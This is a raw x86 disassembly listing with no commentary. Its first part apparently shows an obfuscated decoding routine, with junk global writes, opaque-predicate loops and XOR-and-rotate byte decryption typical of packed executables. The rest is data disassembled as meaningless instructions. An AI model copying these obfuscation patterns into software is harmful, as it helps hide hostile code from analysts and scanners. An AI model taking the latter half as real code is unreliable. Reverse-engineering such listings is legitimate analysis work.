  40391e:	sub    eax,ecx
  403920:	mov    DWORD PTR ds:0x426f15,0x36a1
  40392a:	cmp    edx,eax
  40392c:	jne    0x403b2f
  403932:	mov    eax,DWORD PTR [ebp-0xc]
  403935:	and    DWORD PTR ds:0x426ee1,0x0
  40393f:	jmp    0x403951
  403944:	mov    ecx,DWORD PTR ds:0x426ee1
  40394a:	inc    ecx
  40394b:	mov    DWORD PTR ds:0x426ee1,ecx
  403951:	cmp    DWORD PTR ds:0x426ee1,0x16
  403958:	jae    0x40399f
  40395e:	cmp    DWORD PTR ds:0x426ee1,0xb
  403965:	jge    0x40399f
  40396b:	jmp    0x403980
  403970:	push   0x37fd
  403975:	push   0x426042
  40397a:	call   DWORD PTR ds:0x430a44
  403980:	cmp    DWORD PTR ds:0x426ee1,0xa
  403987:	jne    0x40399a
  40398d:	mov    ecx,DWORD PTR ds:0x426ee1
  403993:	inc    ecx
  403994:	mov    DWORD PTR ds:0x426ee1,ecx
  40399a:	jmp    0x403944
  40399f:	mov    dl,BYTE PTR [eax+ebx*1+0x801]
  4039a6:	mov    eax,DWORD PTR [ebp-0x28]
  4039a9:	mov    ecx,DWORD PTR [ebp-0x18]
  4039ac:	xor    eax,esi
  4039ae:	and    DWORD PTR ds:0x426f09,0x426e85
  4039b8:	xor    ecx,esi
  4039ba:	adc    DWORD PTR ds:0x426e91,0x426ed5
  4039c4:	add    eax,edi
  4039c6:	sbb    DWORD PTR ds:0x426ef1,0x426e99
  4039d0:	add    ecx,edi
  4039d2:	mov    DWORD PTR ds:0x426ed1,0x117e
  4039dc:	mov    BYTE PTR [ebp-0x21],dl
  4039df:	cmp    eax,ecx
  4039e1:	mov    DWORD PTR ds:0x426ea5,0x5630
  4039eb:	jae    0x403af5
  4039f1:	lea    ecx,[eax-0x3272fa]
  4039f7:	and    DWORD PTR ds:0x426e99,0x0
  403a01:	jmp    0x403a13
  403a06:	mov    edx,DWORD PTR ds:0x426e99
  403a0c:	inc    edx
  403a0d:	mov    DWORD PTR ds:0x426e99,edx
  403a13:	cmp    DWORD PTR ds:0x426e99,0x1a
  403a1a:	jae    0x403a48
  403a20:	cmp    DWORD PTR ds:0x426e99,0x24
  403a27:	jle    0x403a48
  403a2d:	jmp    0x403a43
  403a32:	push   DWORD PTR [ebp-0x20]
  403a35:	push   DWORD PTR [ebp-0xc]
  403a38:	push   0x18cc
  403a3d:	call   DWORD PTR ds:0x430a18
  403a43:	jmp    0x403a06
  403a48:	mov    DWORD PTR [ebp-0x14],ecx
  403a4b:	dec    DWORD PTR ds:0x426e89
  403a51:	mov    edx,DWORD PTR [ebp-0x14]
  403a54:	or     DWORD PTR ds:0x426f29,0x426e89
  403a5e:	xor    edx,esi
  403a60:	xor    DWORD PTR ds:0x426ed9,0x426ed5
  403a6a:	add    edx,0x7f55d8fb
  403a70:	lea    ecx,[ebp+eax*4-0xb4]
  403a77:	mov    DWORD PTR ds:0x426e81,0x3e21
  403a81:	mov    DWORD PTR [ecx],edx
  403a83:	mov    DWORD PTR ds:0x426ecd,0x70c2
  403a8d:	mov    edx,DWORD PTR [ecx]
  403a8f:	cmp    edx,0x244ecb9a
  403a95:	jbe    0x403ab0
  403a9b:	add    DWORD PTR ds:0x426edd,0x36b2
  403aa5:	add    DWORD PTR [ecx],0x405fcd9
  403aab:	jmp    0x403ab6
  403ab0:	add    DWORD PTR [ecx],0xfdaf4327
  403ab6:	mov    ecx,DWORD PTR [ebp-0x18]
  403ab9:	xor    ecx,esi
  403abb:	sbb    DWORD PTR ds:0x426f11,0x426ef1
  403ac5:	inc    eax
  403ac6:	inc    DWORD PTR [ebp-0x14]
  403ac9:	sbb    DWORD PTR ds:0x426eb1,0x426ef5
  403ad3:	add    ecx,edi
  403ad5:	mov    DWORD PTR ds:0x426ee5,0x502
  403adf:	cmp    eax,ecx
  403ae1:	jb     0x403a4b
  403ae7:	mov    eax,ds:0x426f1d
  403aec:	xor    DWORD PTR ds:0x426ee9,eax
  403af2:	mov    dl,BYTE PTR [ebp-0x21]
  403af5:	add    eax,DWORD PTR ds:0x426ea1
  403afb:	mov    eax,DWORD PTR [ebp-0x34]
  403afe:	xor    al,0xb3
  403b00:	not    DWORD PTR ds:0x426f0d
  403b06:	mov    cl,0x6
  403b08:	sub    cl,al
  403b0a:	add    dl,cl
  403b0c:	sub    DWORD PTR ds:0x426ed9,0x16fc
  403b16:	mov    ecx,DWORD PTR [ebp-0x1c]
  403b19:	xor    cl,0xb3
  403b1c:	sub    cl,0x6
  403b1f:	ror    dl,cl
  403b21:	xor    eax,eax
  403b23:	or     eax,eax
  403b25:	mov    eax,DWORD PTR [ebp-0xc]
  403b28:	mov    BYTE PTR [eax+ebx*1+0x801],dl
  403b2f:	mov    eax,DWORD PTR [ebp-0xc]
  403b32:	mov    ecx,DWORD PTR [ebp-0x28]
  403b35:	xor    DWORD PTR ds:0x426f11,0x426f09
  403b3f:	sub    eax,edi
  403b41:	xor    DWORD PTR ds:0x426eb5,0x426efd
  403b4b:	xor    eax,esi
  403b4d:	cmp    eax,ecx
  403b4f:	jne    0x403b79
  403b55:	mov    eax,DWORD PTR [ebp-0x8]
  403b58:	mov    ecx,DWORD PTR [ebp-0x10]
  403b5b:	xor    eax,esi
  403b5d:	xor    ecx,esi
  403b5f:	sub    eax,ecx
  403b61:	sub    eax,edi
  403b63:	xor    eax,esi
  403b65:	mov    DWORD PTR [ebp-0x8],eax
  403b68:	mov    eax,DWORD PTR [ebp-0x10]
  403b6b:	xor    eax,esi
  403b6d:	mov    ecx,0xffcd8d87
  403b72:	sub    ecx,eax
  403b74:	jmp    0x403b88
  403b79:	mov    eax,DWORD PTR [ebp-0x10]
  403b7c:	xor    eax,esi
  403b7e:	mov    ecx,0xffcd8d06
  403b83:	sub    ecx,eax
  403b85:	add    ecx,DWORD PTR [ebp-0xc]
  403b88:	mov    DWORD PTR [ebp-0xc],ecx
  403b8b:	mov    eax,DWORD PTR [ebp-0x8]
  403b8e:	cmp    eax,0xf89c85b5
  403b93:	jne    0x40140a
  403b99:	mov    DWORD PTR [ebp-0x34],0xb
  403ba0:	mov    ecx,DWORD PTR [ebp+0x8]
  403ba3:	xor    ecx,esi
  403ba5:	add    ecx,edi
  403ba7:	jmp    0x408537
  403bac:	lea    eax,[ecx+ebx*1]
  403baf:	jmp    0x405f47
  403bb4:	lock and dl,ch
  403bb7:	pop    ebp
  403bb8:	pop    ecx
  403bb9:	ins    BYTE PTR es:[edi],dx
  403bba:	js     0x403bf2
  403bbc:	mov    ds:0x67c4e32d,al
  403bc1:	fisubr DWORD PTR [ecx+0x21]
  403bc4:	hlt    
  403bc5:	pushf  
  403bc6:	jnp    0x403c43
  403bc8:	hlt    
  403bc9:	pushf  
  403bca:	jnp    0x403c47
  403bcc:	fwait
  403bcd:	mov    WORD PTR [edi-0x1f],?
  403bd0:	sub    bh,al
  403bd2:	push   ss
  403bd3:	adc    BYTE PTR [ebx],bh
  403bd5:	dec    ebp
  403bd6:	jo     0x403c07
  403bd8:	add    al,0xa0
  403bda:	sub    ecx,eax
  403bdc:	enter  0xad8d,0x87
  403be0:	add    eax,0x6069955a
  403be5:	bound  edx,QWORD PTR [eax-0x63ddcc12]
  403beb:	cwde   
  403bec:	int3   
  403bed:	ror    DWORD PTR [ecx+0x59bc5a66],cl
  403bf3:	cwde   
  403bf4:	mov    bh,0x6
  403bf6:	xchg   BYTE PTR [edx],cl
  403bf8:	jp     0x403c14
  403bfa:	rcl    BYTE PTR [ecx+0x48],1
  403bfd:	or     eax,DWORD PTR [edx+0x54b23bef]
  403c03:	jecxz  0x403ba1
  403c05:	mov    al,0xbc
  403c07:	mov    bh,BYTE PTR [ebx+0x1797c42b]
  403c0d:	jge    0x403c11
  403c0f:	mov    bh,0x27
  403c11:	(bad)  
  403c12:	popa   
  403c13:	jp     0x403bf4
  403c15:	stc    
  403c16:	das    
  403c17:	or     eax,0xf7b6a53f
  403c1c:	(bad)  
  403c1e:	jb     0x403c8f
  403c20:	lea    ecx,[ebp+0x23b400c3]
  403c26:	or     al,0xf7
  403c28:	and    BYTE PTR [ecx+ebx*1],dl
  403c2b:	xchg   ebx,eax
  403c2c:	inc    ebp
  403c2d:	pushf  
  403c2e:	mov    DWORD PTR [ecx],ebx
  403c30:	bnd jns 0x403bd1
  403c33:	outs   dx,BYTE PTR ds:[esi]
  403c34:	mov    edx,0x60a6201a
  403c39:	pop    ebx
  403c3a:	mov    ebp,0xd7186cdd
  403c3f:	cld    
  403c40:	dec    esp
  403c41:	or     dh,BYTE PTR [edi-0x2e]
  403c44:	std    
  403c45:	rol    cl,cl
  403c47:	dec    ecx
  403c48:	push   ebp
  403c49:	icebp  
  403c4a:	xor    al,bh
  403c4c:	push   ss
  403c4d:	rcr    bh,cl
  403c4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c50:	mov    ds:0x9287111d,eax
  403c55:	mov    BYTE PTR [edx-0x40bd5423],ch
  403c5b:	mov    ecx,0xa769dae6
  403c60:	popf   
  403c61:	mov    ah,0x49
  403c63:	iret   
  403c64:	and    eax,0x628590c6
  403c69:	mov    ah,0x4c
  403c6b:	xor    bh,BYTE PTR [esi+0x7a]
  403c6e:	cmc    
  403c6f:	or     al,0xf4
  403c71:	cwde   
  403c72:	jge    0x403cd5
  403c74:	adc    eax,esp
  403c76:	mov    ecx,0xe65f2904
  403c7b:	in     al,0x88
  403c7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c7e:	xor    eax,0xce1cf84b
  403c83:	pop    ebx
  403c84:	and    BYTE PTR [edi+ebx*1+0x69],dl
  403c88:	iret   
  403c89:	daa    
  403c8a:	cld    
  403c8b:	dec    edx
  403c8c:	sbb    DWORD PTR [ebx+ecx*4],esi
  403c8f:	pop    ds
  403c90:	xor    al,0xa9
  403c92:	pop    ds
  403c93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c94:	add    ebx,DWORD PTR [eax-0x41]
  403c97:	mov    dl,0xae
  403c99:	(bad)  
  403c9a:	mov    esi,0x58e88a82
  403c9f:	out    dx,al
  403ca0:	fs mov bh,0x46
  403ca3:	inc    edx
  403ca4:	clc    
  403ca5:	pusha  
  403ca6:	cmp    eax,0x6b40f9b1
  403cab:	add    dh,bl
  403cad:	out    0x8,al
  403caf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403cb0:	stos   DWORD PTR es:[edi],eax
  403cb1:	loope  0x403cf9
  403cb3:	dec    edi
  403cb4:	data16 jle 0x403c56
  403cb7:	mov    ch,0x53
  403cb9:	cmp    DWORD PTR [edx-0x53181140],edi
  403cbf:	clc    
  403cc0:	mov    WORD PTR [ebx-0x2bca938],es
  403cc6:	loop   0x403cc2
  403cc8:	sbb    BYTE PTR [ecx+0xb],cl
  403ccb:	stos   BYTE PTR es:[edi],al
  403ccc:	mov    esp,0x671d56a7
  403cd1:	test   al,0x2f
  403cd3:	mov    WORD PTR [ecx+0x44],?
  403cd6:	inc    ebx
  403cd7:	inc    eax
  403cd8:	(bad)  
  403cd9:	pop    ecx
  403cda:	pop    ebp
  403cdb:	inc    esp
  403cdc:	lea    esp,[ebx+0x32]
  403cdf:	push   ebx
  403ce0:	or     BYTE PTR ds:0xb1d470f6,dl
  403ce6:	ins    BYTE PTR es:[edi],dx
  403ce7:	dec    esi
  403ce8:	sti    
  403ce9:	popa   
  403cea:	test   eax,0xce86a6e2
  403cef:	sub    DWORD PTR [esi],0x21
  403cf2:	jno    0x403d70
  403cf4:	mul    BYTE PTR [ecx-0x28]
  403cf7:	and    DWORD PTR [esi-0x46],esp
  403cfa:	in     eax,0xe2
  403cfc:	das    
  403cfd:	int3   
  403cfe:	retf   
  403cff:	jg     0x403c8d
  403d01:	dec    esi
  403d02:	push   edx
  403d03:	xor    edx,DWORD PTR [ecx]
  403d05:	ss push ebp
  403d07:	inc    edx
  403d08:	test   al,0xbf
  403d0b:	sub    al,0xb0
  403d0d:	sub    cl,ah
  403d0f:	or     BYTE PTR [edx],ah
  403d11:	enter  0x7e5a,0x7c
  403d15:	bswap  eax
  403d17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d18:	push   edx
  403d19:	das    
  403d1a:	stos   DWORD PTR es:[edi],eax
  403d1b:	je     0x403cb3
  403d1d:	fidiv  DWORD PTR [ecx]
  403d1f:	aad    0xe0
  403d21:	or     BYTE PTR [edx-0x419f34b0],bh
  403d27:	(bad)  
  403d28:	stos   BYTE PTR es:[edi],al
  403d29:	jl     0x403cac
  403d2b:	pop    ebx
  403d2c:	mov    ds,WORD PTR [edx]
  403d2e:	sti    
  403d2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d30:	and    al,0x6b
  403d32:	mov    cl,0xb8
  403d34:	lods   al,BYTE PTR ds:[esi]
  403d35:	dec    esi
  403d36:	pop    esp
  403d37:	or     ecx,DWORD PTR [esi+0x2]
  403d3a:	jae    0x403d62
  403d3c:	mov    bl,0x21
  403d3e:	sub    al,0xcf
  403d40:	std    
  403d41:	pop    ecx
  403d42:	push   0x21
  403d44:	add    al,bl
  403d46:	push   eax
  403d47:	mov    bh,BYTE PTR [ecx]
  403d49:	out    0xac,al
  403d4b:	cmp    DWORD PTR [ebp+0x97cb390],ebx
  403d51:	ss or  al,0xf2
  403d54:	popa   
  403d55:	and    al,0xf1
  403d57:	push   esp
  403d58:	rcl    BYTE PTR [esp+ecx*8],0xa0
  403d5c:	mov    dl,0x29
  403d5e:	fisttp DWORD PTR [eax]
  403d60:	mov    bh,0xe3
  403d62:	push   eax
  403d63:	and    dl,BYTE PTR [edx]
  403d65:	cmp    al,0x28
  403d67:	add    ah,BYTE PTR ds:0x9e035731
  403d6d:	dec    edx
  403d6e:	call   0xc126:0x99f61d6d
  403d75:	mov    ds:0x9e7781b8,al
  403d7a:	push   DWORD PTR [edx]
  403d7c:	and    BYTE PTR [edi],cl
  403d7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d7f:	jl     0x403deb
  403d81:	out    dx,eax
  403d82:	or     BYTE PTR [esi-0x723d0d1f],dh
  403d88:	cmp    al,al
  403d8a:	scas   eax,DWORD PTR es:[edi]
  403d8b:	into   
  403d8c:	mov    ah,0x1b
  403d8e:	fist   DWORD PTR ds:0x48585958
  403d94:	or     DWORD PTR ds:0x4bbd5c04,edx
  403d9a:	xor    BYTE PTR [ebx+0x6be877a7],ah
  403da0:	cmp    DWORD PTR [esi+0x2f],ebp
  403da3:	ffreep st(6)
  403da5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403da6:	call   0xbdcd:0xdf7607c0
  403dad:	into   
  403dae:	add    bl,BYTE PTR [ebx]
  403db0:	pop    ecx
  403db1:	push   0x930e9a6b
  403db6:	xor    eax,0x685afc3a
  403dbb:	ss inc edi
  403dbd:	rcr    DWORD PTR [edx+0x1],cl
  403dc0:	push   ebp
  403dc1:	fcmovnu st,st(0)
  403dc3:	leave  
  403dc4:	div    BYTE PTR [ebx+0x17a7dfa]
  403dca:	pop    esi
  403dcb:	push   esp
  403dcc:	shl    DWORD PTR [edx],1
  403dce:	imul   edx,DWORD PTR [edi+0x1d83d5f4],0xc3229c0a
  403dd8:	pop    DWORD PTR [ebx]
  403dda:	mov    bh,0xd
  403ddc:	add    DWORD PTR [eax+ecx*8-0x3c0f2662],0xfffffffb
  403de4:	or     al,0xc6
  403de6:	pop    es
  403de7:	jne    0x403d86
  403de9:	jmp    0x4fe2f453
  403dee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403def:	ins    BYTE PTR es:[edi],dx
  403df0:	adc    ebx,ebx
  403df2:	fistp  DWORD PTR [ebp+edx*4-0x47]
  403df6:	clc    
  403df7:	jne    0x403e50
  403df9:	imul   ebx,eax,0x6
  403dfc:	int3   
  403dfd:	dec    edx
  403dfe:	mov    DWORD PTR [ebp-0x3cef27da],esi
  403e04:	daa    
  403e05:	in     al,0xc2
  403e07:	jnp    0x403dfe
  403e09:	or     BYTE PTR [esi+0x4f],0xe2
  403e0d:	push   ebp
  403e0e:	stos   DWORD PTR es:[edi],eax
  403e0f:	fwait
  403e10:	sbb    al,0x14
  403e12:	outs   dx,DWORD PTR ds:[esi]
  403e13:	je     0x403dad
  403e15:	pop    esi
  403e16:	jmp    0x216f2f6d
  403e1b:	enter  0x6399,0x5c
  403e1f:	clc    
  403e20:	adc    ebp,DWORD PTR [esi-0x47]
  403e23:	retf   0x3a87
  403e26:	imul   esp,DWORD PTR [ecx+0xb],0x52add2b1
  403e2d:	ret    
  403e2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e2f:	jne    0x403dd8
  403e31:	xor    bl,0xe0
  403e34:	push   edi
  403e35:	mov    al,0xdf
  403e37:	xchg   edx,eax
  403e38:	push   ecx
  403e39:	call   0x3dfc6aba
  403e3e:	cmp    DWORD PTR [eax],ebx
  403e40:	aam    0x74
  403e42:	push   cs
  403e43:	dec    esi
  403e44:	xor    al,0x94
  403e46:	rcr    DWORD PTR [edx],0x5a
  403e49:	dec    esi
  403e4a:	out    dx,al
  403e4b:	jae    0x403ec8
  403e4d:	lock xchg ebx,eax
  403e4f:	sbb    eax,0x574c29c2
  403e54:	std    
  403e55:	add    DWORD PTR cs:[ebx+0x4],0x5e78c87a
  403e5d:	or     eax,0x5c4c1382
  403e62:	xchg   edx,eax
  403e63:	cmp    al,0x7f
  403e65:	vpunpcklbw ymm4,ymm7,ymm5
  403e69:	(bad)  
  403e6a:	or     cl,al
  403e6c:	sub    DWORD PTR [eax],esi
  403e6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e6f:	jbe    0x403e45
  403e71:	cmp    al,0x52
  403e73:	add    eax,0xc72535b2
  403e78:	xchg   ebx,eax
  403e79:	pop    ebx
  403e7a:	stos   DWORD PTR es:[edi],eax
  403e7b:	sbb    bh,0x4b
  403e7e:	loope  0x403e2b
  403e80:	adc    edx,DWORD PTR [ebp-0x17]
  403e83:	adc    al,bh
  403e85:	push   eax
  403e86:	jo     0x403ebf
  403e88:	mov    eax,0xbce1fdfd
  403e8d:	pop    es
  403e8e:	jo     0x403f0f
  403e90:	loope  0x403e69
  403e92:	pop    ebx
  403e93:	in     al,dx
  403e94:	ins    DWORD PTR es:[edi],dx
  403e95:	ret    
  403e96:	or     eax,0x444b618d
  403e9b:	xor    eax,0x808eb5d9
  403ea0:	xchg   BYTE PTR [edx],bl
  403ea2:	pop    edi
  403ea3:	ins    BYTE PTR es:[edi],dx
  403ea4:	scas   al,BYTE PTR es:[edi]
  403ea5:	mov    ah,0xb4
  403ea7:	mov    edx,DWORD PTR [ebp+0x5b559ea5]
  403ead:	test   al,0x2d
  403eaf:	js     0x403ef9
  403eb1:	push   ebp
  403eb2:	not    DWORD PTR [esi+ebx*1-0x557ea500]
  403eb9:	or     eax,0xb7e760
  403ebe:	sbb    ah,BYTE PTR [esi+0x2d]
  403ec1:	repnz cld 
  403ec3:	aaa    
  403ec4:	push   ss
  403ec5:	bound  esp,QWORD PTR [esp+esi*2-0x23]
  403ec9:	mov    edx,0x2028fea5
  403ece:	mov    fs,WORD PTR [eax]
  403ed0:	jle    0x403f23
  403ed2:	add    BYTE PTR ss:[ebx],0x23
  403ed6:	ins    BYTE PTR es:[edi],dx
  403ed7:	inc    edx
  403ed8:	dec    ecx
  403ed9:	scas   eax,DWORD PTR es:[edi]
  403eda:	adc    al,ch
  403edc:	xchg   ebp,eax
  403edd:	pusha  
  403ede:	bound  ebx,QWORD PTR [ebx+0x94bed52]
  403ee4:	aaa    
  403ee5:	lods   al,BYTE PTR ds:[esi]
  403ee6:	jmp    ecx
  403ee8:	push   es
  403ee9:	sbb    edx,DWORD PTR [esp+edi*4-0x71907451]
  403ef0:	pop    ds
  403ef1:	stc    
  403ef2:	or     eax,0xcb20583f
  403ef7:	and    ecx,DWORD PTR [ebp+0xf]
  403efa:	jbe    0x403ed4
  403efc:	xor    al,0x32
  403efe:	es aad 0x88
  403f01:	jns    0x403edd
  403f03:	repnz loopne 0x403f5c
  403f06:	jle    0x403f77
  403f08:	adc    DWORD PTR [ebx],0x965e80b9
  403f0e:	adc    DWORD PTR [eax-0x59dd2163],esp
  403f14:	retf   0xf605
  403f17:	xchg   ebp,eax
  403f18:	xchg   ecx,eax
  403f19:	(bad)  
  403f1a:	pop    ecx
  403f1b:	(bad)  
  403f1c:	push   ds
  403f1d:	mov    cl,0x8e
  403f1f:	(bad)  
  403f20:	rol    DWORD PTR [ecx*1-0x2e8a8a03],1
  403f27:	jg     0x403f74
  403f29:	div    BYTE PTR [edx+0x2c69bd0b]
  403f2f:	out    dx,al
  403f30:	inc    ecx
  403f31:	jnp    0x403f44
  403f33:	push   0x23
  403f35:	cli    
  403f36:	push   cs
  403f37:	adc    eax,0x206595c
  403f3c:	xchg   BYTE PTR [ecx],dl
  403f3e:	or     DWORD PTR [edx+0x78a18396],0x568ca091
  403f48:	push   esp
  403f49:	or     BYTE PTR [edi],bl
  403f4b:	and    eax,0xde2d895d
  403f50:	dec    edx
  403f51:	xchg   edx,eax
  403f52:	fadd   QWORD PTR [esi]
  403f54:	popf   
  403f55:	fimul  DWORD PTR [ecx-0x6d]
  403f58:	sbb    eax,DWORD PTR [ebx*8-0x14be86ea]
  403f5f:	test   eax,0x3af572bf
  403f64:	pushf  
  403f65:	xchg   ebx,eax
  403f66:	enter  0xae9a,0x8a
  403f6a:	(bad)  
  403f6b:	lods   eax,DWORD PTR ds:[esi]
  403f6c:	ret    
  403f6d:	and    edx,DWORD PTR [ebp+0x3e]
  403f70:	mov    cl,0xa6
  403f72:	mov    BYTE PTR [eax+0x4ee79433],cl
  403f78:	shl    DWORD PTR [edx-0x45a9ff0f],1
  403f7e:	in     eax,0x1e
  403f80:	ret    
  403f81:	out    dx,al
  403f82:	out    0xe7,al
  403f84:	add    ebx,DWORD PTR [esi+0x4a]
  403f87:	clc    
  403f88:	rcr    DWORD PTR [ebx],0x7c
  403f8b:	(bad)  
  403f8d:	jle    0x403f28
  403f8f:	imul   eax,DWORD PTR [edx],0x4f7905f5
  403f95:	arpl   WORD PTR [edi],cx
  403f97:	aam    0xb5
  403f99:	ficom  DWORD PTR [ecx+0x6b0ce59f]
  403f9f:	call   0xcbb95b2b
  403fa4:	jecxz  0x403fb4
  403fa6:	xchg   esp,eax
  403fa7:	xor    DWORD PTR [eax],0x39abedd
  403fad:	dec    edi
  403fae:	inc    esp
  403faf:	pop    edx
  403fb0:	ret    
  403fb1:	jp     0x403fe3
  403fb3:	leave  
  403fb4:	int3   
  403fb5:	push   0xd28e8b3b
  403fba:	and    BYTE PTR [edi],0x7a
  403fbd:	or     eax,0x81f24435
  403fc2:	xor    eax,0x9902fc0
  403fc7:	push   eax
  403fc8:	push   ss
  403fc9:	sti    
  403fca:	xchg   ebp,eax
  403fcb:	sub    esi,DWORD PTR [ebx+0x31666f94]
  403fd1:	push   0x57e50d41
  403fd6:	or     esi,DWORD PTR [ebp-0x66]
  403fd9:	mov    dh,0xec
  403fdb:	jle    0x403ff9
  403fdd:	pop    esp
  403fde:	cwde   
  403fdf:	int3   
  403fe0:	loop   0x403f71
  403fe2:	inc    ebp
  403fe3:	sub    al,0xfe
  403fe5:	imul   edi,DWORD PTR [eax-0xc8a42a4],0xffffffa4
  403fec:	mov    ebx,0xd0a6eaef
  403ff1:	stc    
  403ff2:	or     ebx,ecx
  403ff4:	mov    bl,0xa4
  403ff6:	cvtpi2ps xmm2,QWORD PTR [eax-0x457dea6d]
  403ffd:	mov    ds:0xcb3a8d27,al
  404002:	mov    bl,0x3c
  404004:	rol    BYTE PTR [ecx],1
  404006:	push   esp
  404007:	sub    al,cl
  404009:	ins    BYTE PTR es:[edi],dx
  40400a:	shr    al,cl
  40400c:	dec    ecx
  40400d:	in     eax,0x77
  40400f:	push   ebx
  404010:	pushf  
  404011:	mov    fs,WORD PTR [edx]
  404013:	adc    eax,0xe9b523c5
  404018:	out    dx,eax
  404019:	pop    ecx
  40401a:	cmp    DWORD PTR ds:0x8e5126d9,0x98aa1b80
  404024:	fsub   QWORD PTR [esi+0x6c3f23e9]
  40402a:	inc    ecx
  40402b:	or     al,0x87
  40402d:	lea    edi,[eax]
  40402f:	sbb    eax,0x5a40c3a2
  404034:	pop    ebx
  404035:	cmp    eax,0x52dc007b
  40403a:	dec    ebx
  40403b:	push   ds
  40403c:	mov    cl,0x8e
  40403e:	rcr    ah,cl
  404040:	pop    ds
  404041:	xchg   esi,eax
  404042:	aas    
  404043:	int    0xa7
  404045:	ror    DWORD PTR [eax-0x35],0x49
  404049:	ret    
  40404a:	mov    eax,ds:0x456ffb71
  40404f:	push   ds
  404050:	inc    ecx
  404051:	int3   
  404052:	jmp    0xe61:0xa3c070b6
  404059:	push   eax
  40405a:	out    0x4e,al
  40405c:	clc    
  40405d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40405e:	ja     0x403ff7
  404060:	imul   ebp,ebx,0xffffffe5
  404063:	mov    edx,DWORD PTR [eax]
  404065:	jnp    0x40406b
  404067:	xor    edi,DWORD PTR [edi+esi*8-0x21693fa2]
  40406e:	jmp    0x391a:0xc21e6cd1
  404075:	sbb    al,0x2
  404077:	(bad)  
  404078:	dec    ebp
  404079:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40407a:	pop    ss
  40407b:	lahf   
  40407c:	out    0x3f,al
  40407e:	cli    
  40407f:	push   eax
  404080:	scas   eax,DWORD PTR es:[edi]
  404081:	mov    ecx,0xaf750732
  404086:	jno    0x4040cd
  404088:	ins    DWORD PTR es:[edi],dx
  404089:	mov    ecx,0x1df7981e
  40408e:	inc    edx
  40408f:	mov    ds:0x423c15ba,eax
  404094:	adc    al,BYTE PTR [ecx]
  404096:	push   ds
  404097:	dec    edx
  404098:	ds mov eax,0x74cfd646
  40409e:	dec    eax
  40409f:	(bad)  
  4040a0:	std    
  4040a1:	inc    ecx
  4040a2:	cmp    al,0xdf
  4040a4:	sub    esp,DWORD PTR [eax+edi*4+0x57212eb6]
  4040ab:	stos   BYTE PTR es:[edi],al
  4040ac:	pop    ds
  4040ad:	adc    DWORD PTR [ebp-0x548fe141],edi
  4040b3:	repnz scas al,BYTE PTR es:[edi]
  4040b5:	mov    edi,0xcaa52e25
  4040ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040bb:	xor    edx,ebx
  4040bd:	test   eax,0xcfc980f2
  4040c2:	dec    ebp
  4040c3:	jg     0x404075
  4040c5:	bound  edi,QWORD PTR [eax-0x18]
  4040c8:	add    ebx,DWORD PTR [ebx]
  4040ca:	adc    al,0xef
  4040cc:	inc    edx
  4040cd:	shl    DWORD PTR [esi],cl
  4040cf:	fisub  WORD PTR [ebx+0x3f962787]
  4040d5:	mov    al,ss:0x292d5d5f
  4040db:	stos   BYTE PTR es:[edi],al
  4040dc:	call   0xc886:0x9aefcf69
  4040e3:	jne    0x404081
  4040e5:	mov    al,0xaa
  4040e7:	rcr    DWORD PTR [edx+0x73d2403e],1
  4040ed:	xchg   esp,eax
  4040ee:	retf   0x877
  4040f1:	call   0x1728:0x26896db
  4040f8:	adc    ecx,DWORD PTR [esi]
  4040fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040fb:	mov    DWORD PTR [edi-0x4147214],eax
  404101:	lods   al,BYTE PTR ds:[esi]
  404102:	inc    eax
  404103:	popf   
  404104:	dec    esp
  404105:	retf   0xf55
  404108:	hlt    
  404109:	xchg   ebp,eax
  40410a:	and    al,0x6f
  40410c:	push   ss
  40410d:	adc    eax,DWORD PTR [eax-0x51]
  404110:	xor    DWORD PTR [ebp-0x1f065526],ebp
  404116:	add    al,bl
  404118:	sahf   
  404119:	pop    edi
  40411a:	mov    dl,0xd9
  40411c:	pop    edx
  40411d:	cdq    
  40411e:	(bad)  
  40411f:	pop    ebp
  404120:	js     0x404127
  404122:	les    eax,FWORD PTR [esp+ebx*2-0x6f]
  404126:	lds    ebp,FWORD PTR [ecx+eiz*1]
  404129:	sub    eax,0xc45f70a3
  40412e:	or     esi,edi
  404130:	jns    0x404181
  404132:	jle    0x4040c8
  404134:	mov    ds:0xce5b5bce,al
  404139:	das    
  40413a:	xchg   edx,eax
  40413b:	rol    BYTE PTR [edx-0x121ede6d],0x8b
  404142:	mov    eax,esp
  404144:	out    dx,al
  404145:	push   ebp
  404146:	je     0x4040e4
  404148:	dec    ecx
  404149:	nop
  40414a:	retf   
  40414b:	mov    eax,0x61474165
  404150:	imul   eax,DWORD PTR [esi-0x7af055b],0xffffff91
  404157:	cmp    DWORD PTR [ecx+0x6f],ebx
  40415a:	mov    edx,0xc2ae8899
  40415f:	(bad)  
  404160:	scas   al,BYTE PTR es:[edi]
  404161:	and    al,0x60
  404163:	ret    0x255
  404166:	and    eax,0x1d194bb6
  40416b:	jmp    0x40412e
  40416d:	jo     0x40410f
  40416f:	into   
  404170:	inc    edx
  404171:	sub    DWORD PTR [ebx],0x5face0ee
  404177:	or     ch,bl
  404179:	jbe    0x4041a2
  40417b:	out    0x26,al
  40417d:	mov    ecx,0x5a27e38f
  404182:	hlt    
  404183:	lods   al,BYTE PTR ds:[esi]
  404184:	mov    esi,0x7e3b553c
  404189:	sub    DWORD PTR [ebx-0x311cd3cd],0x44dbc0f3
  404193:	inc    esi
  404194:	repnz sub al,0xc8
  404197:	cmp    BYTE PTR [eax],0x3e
  40419a:	ret    
  40419b:	cmp    BYTE PTR [edx-0x47],al
  40419e:	sub    edi,DWORD PTR [eax+0x48]
  4041a1:	jge    0x40414c
  4041a3:	rol    ebx,cl
  4041a5:	int3   
  4041a6:	mov    BYTE PTR [edi+0x79],dl
